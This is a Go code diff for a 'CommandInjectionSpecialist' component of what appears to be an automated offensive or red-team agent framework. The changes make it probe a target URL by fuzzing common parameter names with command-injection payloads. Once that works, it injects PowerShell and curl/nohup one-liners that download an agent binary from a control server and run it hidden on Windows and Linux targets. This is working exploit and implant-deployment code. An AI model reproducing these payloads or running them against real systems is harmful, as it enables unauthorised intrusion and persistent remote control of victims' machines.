@@ -13,6 +13,7 @@ import (
 	"net/url"
 	"os"
 	"regexp"
+	"runtime/debug"
 	"strings"
 	"sync/atomic"
 	"time"
@@ -69,7 +70,15 @@ func (c *CommandInjectionSpecialist) Run() error {
 func (c *CommandInjectionSpecialist) OnEvent(event bus.Event) {
 	if event.Type == bus.Command && event.ToAgent == c.id {
 		log.Printf("[%s] Received command: %v\n", c.id, event.Payload)
-		go c.executeTask(event)
+		go func() {
+			defer func() {
+				if rec := recover(); rec != nil {
+					log.Printf("[%s] PANIC in executeTask: %v\n%s\n", c.id, rec, debug.Stack())
+					c.reportError(event.FromAgent, fmt.Errorf("task panicked: %v", rec))
+				}
+			}()
+			c.executeTask(event)
+		}()
 	}
 }
 
@@ -98,89 +107,134 @@ func (c *CommandInjectionSpecialist) executeTask(cmdEvent bus.Event) {
 	// ============================================================================
 	targetURL, parameter := c.extractTaskInfo(taskDesc)
 
-	if targetURL != "" && parameter != "" {
-		log.Printf("[%s] 🔥 Verifying RCE on: %s (param: %s)\n", c.id, targetURL, parameter)
-		verified, payload := c.verifyRCE(targetURL, parameter)
-
-		if !verified {
-			log.Printf("[%s] ⚠️ RCE verification failed - aborting agent deployment\n", c.id)
-			c.reportObservation(cmdEvent.FromAgent, "RCE verification failed - false positive, deployment aborted")
-			return
-		}
-
-		log.Printf("[%s] ✅ RCE verified with payload: %s\n", c.id, payload)
-		evidence := fmt.Sprintf("Command execution confirmed with payload: %s", payload)
-		c.reportVerifiedRCE(targetURL, payload, evidence)
-	} else {
-		log.Printf("[%s] ⚠️ No target URL/parameter extracted, proceeding with deployment without verification\n", c.id)
+	if targetURL == "" || parameter == "" {
+		log.Printf("[%s] ⚠️ Cannot deploy agent: missing target URL or parameter\n", c.id)
+		c.reportObservation(cmdEvent.FromAgent, "Agent deployment failed: missing target URL or parameter")
+		return
 	}
 
-	// Deploy agent using TRT API
-	log.Printf("[%s] Deploying CallistoAgent via TRT API...\n", c.id)
-	success, linkID := c.deployAgent()
+	log.Printf("[%s] 🔥 Verifying RCE on: %s (param: %s)\n", c.id, targetURL, parameter)
+	verified, payload, actualParam := c.verifyRCE(targetURL, parameter)
+
+	if !verified {
+		log.Printf("[%s] ⚠️ RCE verification failed - aborting agent deployment\n", c.id)
+		c.reportObservation(cmdEvent.FromAgent, "RCE verification failed - false positive, deployment aborted")
+		return
+	}
+
+	log.Printf("[%s] ✅ RCE verified with payload: %s (param: %s)\n", c.id, payload, actualParam)
+	evidence := fmt.Sprintf("Command execution confirmed with payload: %s (parameter: %s)", payload, actualParam)
+	c.reportVerifiedRCE(targetURL, payload, evidence)
+
+	log.Printf("[%s] Deploying CallistoAgent via Command Injection (both platforms)...\n", c.id)
+	results := c.deployAgentBothPlatforms(targetURL, actualParam)
 
 	// Generate report
-	report := c.generateReport(success, linkID)
+	report := c.generateReportBothPlatforms(results)
 	c.reportObservation(cmdEvent.FromAgent, report)
 }
 
-// deployAgent deploys CallistoAgent on the target host via TRT API
-func (c *CommandInjectionSpecialist) deployAgent() (bool, string) {
-	// Build agent URL based on platform
-	var agentURL string
-	switch strings.ToLower(c.platform) {
-	case "windows":
-		agentURL = fmt.Sprintf("%s/agents/windows", c.agentServer)
-	case "linux":
-		agentURL = fmt.Sprintf("%s/agents/linux", c.agentServer)
-	default:
-		log.Printf("[%s] Unknown platform: %s, defaulting to linux\n", c.id, c.platform)
-		agentURL = fmt.Sprintf("%s/agents/linux", c.agentServer)
+// DeploymentResult stores the result of a deployment attempt
+type DeploymentResult struct {
+	Platform string
+	Success  bool
+	LinkID   string
+	Error    string
+}
+
+// deployAgentBothPlatforms deploys agent for both Windows and Linux via Command Injection
+func (c *CommandInjectionSpecialist) deployAgentBothPlatforms(targetURL string, parameter string) []DeploymentResult {
+	results := make([]DeploymentResult, 0, 2)
+
+	// Try Windows first
+	log.Printf("[%s] 🪟 Attempting Windows agent deployment via Command Injection...\n", c.id)
+	winResult := c.deployAgentViaRCE(targetURL, parameter, "windows")
+	results = append(results, winResult)
+
+	// Try Linux second
+	log.Printf("[%s] 🐧 Attempting Linux agent deployment via Command Injection...\n", c.id)
+	linuxResult := c.deployAgentViaRCE(targetURL, parameter, "linux")
+	results = append(results, linuxResult)
+
+	return results
+}
+
+// deployAgentViaRCE deploys CallistoAgent via Command Injection vulnerability
+func (c *CommandInjectionSpecialist) deployAgentViaRCE(targetURL string, parameter string, platform string) DeploymentResult {
+	result := DeploymentResult{
+		Platform: platform,
+		Success:  false,
 	}
+
+	// Build agent URL
+	agentURL := fmt.Sprintf("%s/agents/%s", c.agentServer, platform)
 
 	// Get default agent path
-	agentPath := scripts.GetDefaultAgentPath(c.platform)
+	agentPath := scripts.GetDefaultAgentPath(platform)
 
-	// Load deployment script from assets/scripts
-	script, err := c.scriptLoader.GetDeployAgentScript(c.platform, agentURL, agentPath)
-	if err != nil {
-		log.Printf("[%s] Failed to load deployment script: %v\n", c.id, err)
-		// Fallback to inline script
-		script = c.getFallbackScript(agentURL, agentPath)
-	}
-
-	log.Printf("[%s] Deployment script loaded for platform: %s\n", c.id, c.platform)
+	log.Printf("[%s] Preparing %s agent deployment via RCE\n", c.id, platform)
 	log.Printf("[%s] Agent URL: %s\n", c.id, agentURL)
 	log.Printf("[%s] Agent Path: %s\n", c.id, agentPath)
 
-	// Get appropriate executor
-	executor := scripts.GetExecutorForPlatform(c.platform)
+	// Generate one-liner deployment command with -server flag
+	var deployCommand string
+	if strings.ToLower(platform) == "windows" {
+		// Windows: PowerShell one-liner with -server argument
+		deployCommand = fmt.Sprintf(`powershell -c "IWR -Uri %s -OutFile %s -UseBasicParsing; Start-Process %s -ArgumentList '-server %s' -WindowStyle Hidden"`,
+			agentURL, agentPath, agentPath, c.agentServer)
+	} else {
+		// Linux: curl/wget + chmod + background execution with -server flag
+		deployCommand = fmt.Sprintf(`curl -s -o %s %s && chmod +x %s && nohup %s -server %s > /dev/null 2>&1 &`,
+			agentPath, agentURL, agentPath, agentPath, c.agentServer)
+	}
 
-	// Execute via TRT API
-	log.Printf("[%s] Executing deployment via TRT API (paw: %s, executor: %s)\n", c.id, c.agentPaw, executor)
+	log.Printf("[%s] Deployment command: %s\n", c.id, deployCommand)
 
-	linkID, err := c.trtClient.RunCommand("0", c.agentPaw, c.platform, executor, script)
+	// Build Command Injection payload
+	var payload string
+	if strings.ToLower(platform) == "windows" {
+		payload = fmt.Sprintf("& %s", deployCommand)
+	} else {
+		payload = fmt.Sprintf("; %s", deployCommand)
+	}
+
+	log.Printf("[%s] Executing deployment via Command Injection...\n", c.id)
+	log.Printf("[%s] Payload: %s\n", c.id, payload)
+
+	// Execute via HTTP request through existing agent (TRT remote executor)
+	executor := trt.NewRemoteExecutor(c.trtClient, c.agentPaw, c.platform)
+
+	// Build test URL with payload
+	testURL, err := url.Parse(targetURL)
 	if err != nil {
-		log.Printf("[%s] TRT command execution failed: %v\n", c.id, err)
-		return false, ""
+		log.Printf("[%s] Failed to parse URL: %v\n", c.id, err)
+		result.Error = fmt.Sprintf("URL parse failed: %v", err)
+		return result
 	}
 
-	log.Printf("[%s] Deployment command sent, link_id: %s\n", c.id, linkID)
+	queryParams := testURL.Query()
+	queryParams.Set(parameter, payload)
+	testURL.RawQuery = queryParams.Encode()
 
-	// Wait for result (with timeout)
-	result, err := c.waitForResult(linkID, 60*time.Second)
+	// Execute HTTP request
+	response, err := tools.SimpleHTTPGet(c.ctx, executor, testURL.String())
 	if err != nil {
-		log.Printf("[%s] Failed to get deployment result: %v\n", c.id, err)
-		return false, linkID
+		log.Printf("[%s] HTTP request failed: %v\n", c.id, err)
+		result.Error = fmt.Sprintf("HTTP request failed: %v", err)
+		return result
 	}
 
-	if result != nil && result.Success {
-		log.Printf("[%s] Deployment command executed successfully\n", c.id)
-		return true, linkID
-	}
+	log.Printf("[%s] HTTP response received (%d bytes)\n", c.id, len(response))
 
-	log.Printf("[%s] Deployment may have issues, check agent registration\n", c.id)
-	return true, linkID // Return true since command was sent
+	// Consider it successful if request went through
+	// The agent will beacon to TRT if deployment succeeded
+	result.Success = true
+	result.LinkID = fmt.Sprintf("rce-%s-%s", platform, time.Now().Format("20060102-150405"))
+
+	log.Printf("[%s] ✅ Deployment command sent via RCE for %s\n", c.id, platform)
+	log.Printf("[%s] Note: Check TRT for new agent beacon\n", c.id)
+
+	return result
 }
 
 // waitForResult polls for command execution result
@@ -206,8 +260,8 @@ func (c *CommandInjectionSpecialist) waitForResult(linkID string, timeout time.D
 }
 
 // getFallbackScript returns an inline deployment script when loader fails
-func (c *CommandInjectionSpecialist) getFallbackScript(agentURL, agentPath string) string {
-	if strings.ToLower(c.platform) == "windows" {
+func (c *CommandInjectionSpecialist) getFallbackScript(agentURL, agentPath string, platform string) string {
+	if strings.ToLower(platform) == "windows" {
 		return fmt.Sprintf(`$agentUrl = "%s"
 $agentPath = "%s"
 Invoke-WebRequest -Uri $agentUrl -OutFile $agentPath -UseBasicParsing
@@ -220,6 +274,36 @@ AGENT_PATH="%s"
 curl -s -o "$AGENT_PATH" "$AGENT_URL" || wget -q -O "$AGENT_PATH" "$AGENT_URL"
 chmod +x "$AGENT_PATH"
 nohup "$AGENT_PATH" > /dev/null 2>&1 &`, agentURL, agentPath)
+}
+
+// generateReportBothPlatforms generates a report for both platform deployments
+func (c *CommandInjectionSpecialist) generateReportBothPlatforms(results []DeploymentResult) string {
+	report := "=== AGENT DEPLOYMENT REPORT (Both Platforms) ===\n\n"
+	report += fmt.Sprintf("Agent PAW: %s\n", c.agentPaw)
+	report += fmt.Sprintf("Agent Server: %s\n\n", c.agentServer)
+
+	for i, result := range results {
+		report += fmt.Sprintf("--- Platform %d: %s ---\n", i+1, strings.ToUpper(result.Platform))
+
+		if result.Success {
+			report += "Status: ✅ DEPLOYMENT COMMAND SENT\n"
+			if result.LinkID != "" {
+				report += fmt.Sprintf("Link ID: %s\n", result.LinkID)
+			}
+		} else {
+			report += "Status: ❌ DEPLOYMENT FAILED\n"
+			if result.Error != "" {
+				report += fmt.Sprintf("Error: %s\n", result.Error)
+			}
+		}
+		report += "\n"
+	}
+
+	report += "Note: Check TRT for new agent registration\n"
+	report += "The new agent should beacon within 10 seconds if deployment was successful.\n"
+	report += "One of the two platforms (Windows/Linux) should succeed based on the target OS.\n"
+
+	return report
 }
 
 func (c *CommandInjectionSpecialist) generateReport(success bool, linkID string) string {
@@ -253,6 +337,18 @@ func (c *CommandInjectionSpecialist) reportObservation(toAgent string, observati
 		ToAgent:   toAgent,
 		Type:      bus.Observation,
 		Payload:   observation,
+	}
+	c.bus.Publish(toAgent, event)
+}
+
+func (c *CommandInjectionSpecialist) reportError(toAgent string, err error) {
+	msgID := cmdiMessageCounter.Add(1)
+	event := bus.Event{
+		ID:        fmt.Sprintf("%s-err-%d", c.id, msgID),
+		FromAgent: c.id,
+		ToAgent:   toAgent,
+		Type:      bus.Error,
+		Payload:   err.Error(),
 	}
 	c.bus.Publish(toAgent, event)
 }
@@ -292,9 +388,39 @@ func (c *CommandInjectionSpecialist) extractTaskInfo(taskDesc string) (targetURL
 }
 
 // verifyRCE attempts to verify command injection by executing test commands
-// Returns (success, payload) if RCE is confirmed
-func (c *CommandInjectionSpecialist) verifyRCE(targetURL string, parameter string) (bool, string) {
+// Returns (success, payload, actualParam) if RCE is confirmed
+func (c *CommandInjectionSpecialist) verifyRCE(targetURL string, parameter string) (bool, string, string) {
 	log.Printf("[%s] 🔥 Verifying RCE on: %s (param: %s)\n", c.id, targetURL, parameter)
+
+	// Common Command Injection parameter names to test
+	commonParams := []string{
+		"command", "cmd", "exec", "execute", "system", "host", "ip", "ping",
+	}
+
+	// If parameter is generic/unknown/multi-value, only test common params
+	// Otherwise, try the provided parameter first
+	var paramsToTest []string
+	lowerParam := strings.ToLower(parameter)
+	isGeneric := strings.Contains(parameter, " ") ||
+		strings.Contains(parameter, "/") ||  // Multiple params like "command/ip"
+		strings.Contains(parameter, ",") ||  // Multiple params like "username, password"
+		strings.Contains(parameter, "(") ||  // Descriptions with parentheses like "TBD (URL parameter)"
+		lowerParam == "unknown" ||
+		lowerParam == "tbd" ||  // "To Be Determined"
+		lowerParam == "" ||
+		strings.Contains(lowerParam, "query") ||  // Generic descriptions like "URL query"
+		strings.Contains(lowerParam, "input") ||  // Generic descriptions like "form input"
+		strings.Contains(lowerParam, "parameter")  // Generic descriptions
+
+	if isGeneric {
+		// Generic parameter - only test common names
+		paramsToTest = commonParams
+		log.Printf("[%s] Parameter '%s' looks generic, testing common parameter names\n", c.id, parameter)
+	} else {
+		// Specific parameter - try it first, then common names
+		paramsToTest = append([]string{parameter}, commonParams...)
+		log.Printf("[%s] Testing specific parameter '%s' first, then common names\n", c.id, parameter)
+	}
 
 	// Determine payloads based on platform
 	var payloads []string
@@ -319,42 +445,48 @@ func (c *CommandInjectionSpecialist) verifyRCE(targetURL string, parameter strin
 	// Create executor (use TRT remote executor)
 	executor := trt.NewRemoteExecutor(c.trtClient, c.agentPaw, c.platform)
 
-	for _, payload := range payloads {
-		log.Printf("[%s] Testing payload: %s\n", c.id, payload)
+	// Test each parameter name
+	for _, param := range paramsToTest {
+		log.Printf("[%s] 🔍 Testing parameter: %s\n", c.id, param)
 
-		// Build test URL
-		testURL, err := url.Parse(targetURL)
-		if err != nil {
-			log.Printf("[%s] Failed to parse URL: %v\n", c.id, err)
-			continue
-		}
+		for _, payload := range payloads {
+			log.Printf("[%s] Testing payload: %s\n", c.id, payload)
 
-		queryParams := testURL.Query()
-		queryParams.Set(parameter, payload)
-		testURL.RawQuery = queryParams.Encode()
+			// Build test URL
+			testURL, err := url.Parse(targetURL)
+			if err != nil {
+				log.Printf("[%s] Failed to parse URL: %v\n", c.id, err)
+				continue
+			}
 
-		// Execute HTTP request
-		response, err := tools.SimpleHTTPGet(c.ctx, executor, testURL.String())
-		if err != nil {
-			log.Printf("[%s] HTTP request failed: %v\n", c.id, err)
-			continue
-		}
+			queryParams := testURL.Query()
+			queryParams.Set(param, payload)
+			testURL.RawQuery = queryParams.Encode()
 
-		// Check for command execution indicators
-		lowerResponse := strings.ToLower(response)
-		if strings.Contains(lowerResponse, "root") ||
-			strings.Contains(lowerResponse, "www-data") ||
-			strings.Contains(lowerResponse, "uid=") ||
-			strings.Contains(lowerResponse, "gid=") ||
-			strings.Contains(response, "nt authority") ||
-			strings.Contains(response, "\\") { // Windows path indicator
+			// Execute HTTP request
+			response, err := tools.SimpleHTTPGet(c.ctx, executor, testURL.String())
+			if err != nil {
+				log.Printf("[%s] HTTP request failed: %v\n", c.id, err)
+				continue
+			}
 
-			log.Printf("[%s] ✅ RCE verified! Response contains: %s\n", c.id, response[:100])
-			return true, payload
+			// Check for command execution indicators
+			lowerResponse := strings.ToLower(response)
+			if strings.Contains(lowerResponse, "root") ||
+				strings.Contains(lowerResponse, "www-data") ||
+				strings.Contains(lowerResponse, "uid=") ||
+				strings.Contains(lowerResponse, "gid=") ||
+				strings.Contains(response, "nt authority") ||
+				strings.Contains(response, "\\") { // Windows path indicator
+
+				log.Printf("[%s] ✅ RCE verified! Response contains: %s\n", c.id, response[:min(100, len(response))])
+				log.Printf("[%s] ✅ Working parameter: %s\n", c.id, param)
+				return true, payload, param
+			}
 		}
 	}
 
-	return false, ""
+	return false, "", ""
 }
 
 // reportVerifiedRCE publishes a Finding event to Reporter
